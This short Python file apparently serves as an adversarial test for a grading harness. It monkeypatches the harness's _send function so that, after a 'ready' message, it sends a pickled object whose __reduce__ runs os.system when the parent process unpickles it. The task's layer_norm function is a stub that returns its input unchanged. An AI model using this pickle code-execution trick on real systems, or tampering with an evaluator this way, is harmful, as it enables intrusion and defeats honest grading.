import os
import pickle

from torch import Tensor

import assay.ch01.run


class RunsCodeWhenUnpickled:
    def __reduce__(self) -> tuple:
        return (os.system, ("echo PWNED: the parent unpickled a child reply",))


def _forged_send(fd: int, header: dict, blobs: dict) -> None:
    os.write(fd, pickle.dumps(RunsCodeWhenUnpickled()))


_original_send = assay.ch01.run._send


def _send_ready_then_forge(fd: int, header: dict, blobs: dict) -> None:
    sender = _original_send if header.get("kind") == "ready" else _forged_send
    sender(fd, header, blobs)


assay.ch01.run._send = _send_ready_then_forge


def layer_norm(x: Tensor, weight: Tensor, bias: Tensor, eps: float) -> Tensor:
    return x
